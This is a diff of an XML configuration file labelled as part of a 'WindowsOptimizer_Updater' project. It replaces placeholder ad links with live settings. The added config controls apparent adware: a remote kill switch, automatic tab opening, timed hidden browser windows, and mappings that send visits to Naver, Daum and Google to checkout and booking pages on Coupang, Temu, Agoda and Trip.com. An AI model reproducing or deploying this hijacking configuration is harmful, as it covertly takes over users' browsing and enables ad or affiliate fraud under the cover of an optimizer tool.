@@ -1,20 +1,45 @@
 <?xml version="1.0" encoding="utf-8"?>
 <!-- GitHub: jcgAsia/WindowsOptimizer_Updater/main/mapping.xml -->
-<!--https://github.com/jcgAsia/WindowsOptimizer_Updater/blob/main/mapping.xml-->
-<mappings>
-  <map>
-    <trigger>naver.com</trigger>
-    <target>https://example.com/ad/naver</target>
-    <frequency>30</frequency>
-  </map>
-  <map>
-    <trigger>daum.net</trigger>
-    <target>https://example.com/ad/daum</target>
-    <frequency>60</frequency>
-  </map>
-  <map>
-    <trigger>google.com</trigger>
-    <target>https://example.com/ad/google</target>
-    <frequency>15</frequency>
-  </map>
-</mappings>
+<!-- PlanB 기능명세서 V1.4 기준 -->
+<config>
+	<!-- 전역 제어: on=전체 기능 중지, off=정상 작동 -->
+	<forcedown>off</forcedown>
+
+	<!-- 탭브라우저 기능 -->
+	<autotab>on</autotab>
+	<autotab_cycletime>1800</autotab_cycletime>
+
+	<!-- 히든윈도우 기능 -->
+	<openhd>on</openhd>
+	<openhd_delaytime>180</openhd_delaytime>
+	<openhd_closetime>600</openhd_closetime>
+	<openhd_cycletime>1800</openhd_cycletime>
+
+	<mappings>
+		<map>
+			<trigger>search.naver.com</trigger>
+			<target>www.agoda.com/ko-kr/book</target>
+			<frequency>2</frequency>
+		</map>
+		<map>
+			<trigger>naver.com</trigger>
+			<target>temu.com</target>
+			<frequency>5</frequency>
+		</map>
+		<map>
+			<trigger>search.daum.net</trigger>
+			<target>checkout.coupang.com</target>
+			<frequency>2</frequency>
+		</map>
+		<map>
+			<trigger>daum.net</trigger>
+			<target>checkout.coupang.com</target>
+			<frequency>2</frequency>
+		</map>
+		<map>
+			<trigger>google.com</trigger>
+			<target>kr.trip.com/hotels/booknew</target>
+			<frequency>1</frequency>
+		</map>
+	</mappings>
+</config>
